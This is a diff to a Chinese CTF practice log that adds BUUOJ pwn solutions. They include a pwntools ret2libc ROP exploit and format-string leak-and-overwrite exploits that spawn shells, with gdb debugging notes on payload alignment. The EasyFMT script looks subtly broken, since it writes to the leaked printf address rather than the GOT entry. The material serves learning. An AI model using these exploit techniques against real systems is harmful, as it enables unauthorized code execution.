@@ -1,3 +1,7 @@
+---
+typora-copy-images-to: ./images
+---
+
 # buu刷题记录（61-80题）
 
 by Maple
@@ -233,3 +237,151 @@ p.send(shellcode)
 p.interactive()
 ```
 
+## 70 jarviso_level5
+
+ret2libc_x86
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25410)
+elf = ELF('./pwn')
+libc = ELF('./libc-2.19.so')
+#gdb.attach(p)
+
+pop_rdi = 0x00000000004006b3
+pop_rsi_r15 = 0x00000000004006b1
+write_got = elf.got['write']
+write_plt = elf.plt['write']
+main = elf.sym['main']
+p.recvuntil(b'\n')
+payload = b'a'*0x80+b'b'*0x8+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+
+p64(write_plt)+p64(main)
+p.send(payload)
+write_addr  = u64(p.recv(8))
+
+libc = LibcSearcher("write",write_addr)
+libc_base = write_addr-libc.dump('write')
+log.info("libc_base:"+hex(libc_base))
+
+sys = libc_base+libc.dump('system')
+binsh = libc_base+libc.dump('str_bin_sh')
+payload2 = b'a'*0x88+p64(pop_rdi)+p64(binsh)+p64(sys)+p64(0)
+p.sendline(payload2)
+p.interactive()
+```
+
+## 72 网鼎杯第二轮EasyFMT
+
+格串泄露+格串实现任意写
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'node5.buuoj.cn'
+post = 29555
+#p = process('./pwn')
+p = remote(host,post)
+elf = ELF('./pwn')
+#gdb.attach(p)
+
+offset = 6
+
+payload = p32(elf.got['printf'])+b'%6$s'
+p.sendline(payload)
+printf_addr = u32(p.recvuntil(b'\xf7')[-4:])
+log.info("printf_addr:"+hex(printf_addr))
+
+libc = LibcSearcher('printf',printf_addr)
+libc_base = printf_addr-libc.dump('printf')
+log.info("libc_base:"+hex(libc_base))
+sys = libc_base+libc.dump('system')
+sys = libc_base+libc.sym['system']
+payload = fmtstr_payload(offset,{printf_addr:sys})
+p.sendline(payload)
+p.sendline(b'/bin/sh\x00')
+
+
+p.interactive()
+
+```
+
+## 73 mrctf2020_easy_equation
+
+格串_x86,有些小细节
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='i386',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+host = 'node5.buuoj.cn'
+post = 29555
+p = process('./pwn')
+#p = remote(host,post)
+elf = ELF('./pwn')
+#gdb.attach(p)
+
+payload = b'aa%9$nAAA'+p64(0x60105c)
+p.sendline(payload)
+pause()
+p.interactive()
+```
+
+经过检查
+
+- `judge==2`时，执行shell，
+
+- 没有开启ASLR和PIE
+
+- 有格串漏洞
+
+- judge_addr = 0x60105c
+
+- 输入地址的偏移为8（其实实际上是第7位的最后一位，加一位补齐就行了）
+
+  > [!NOTE]
+  >
+  > ![image-20250407215530661](./images/image-20250407215530661.png)
+  >
+  > 可以看到gdb这里看的很清楚，输入了4个a，第一个在`rax-7`处
+
+那么我们填充到第8位试一下
+
+`payload = b’aa%8$n’+p64(0x60105c)`
+
+不能getshell，看一下调式信息
+
+![image-20250407215947954](./images/image-20250407215947954.png)
+
+发现judge并没有改变，为什么呢？
+
+![image-20250407221059658](./images/image-20250407221059658.png)
+
+![image-20250407222551459](./images/image-20250407222551459.png)
+
+其实第一个被拿去补位了，它又只有五位，导致后面地址也出现了偏移，被截断了（60之后全是00）
+
+所以payload应再补3位对齐，这个时候地址偏移应该是到了第9位
+
+`payload = b’aa%8$nAAA’+p64(0x60105c)`
+
+调试看看
+
+![image-20250407223239794](./images/image-20250407223239794.png)
+
+![image-20250407223423590](./images/image-20250407223423590.png)
+
+地址被挤到了第9位，WIN!
+
+> [!IMPORTANT]
+>
+> 其实payload直接写成`b’a’*0x9+p64(0x4006D0)`也行
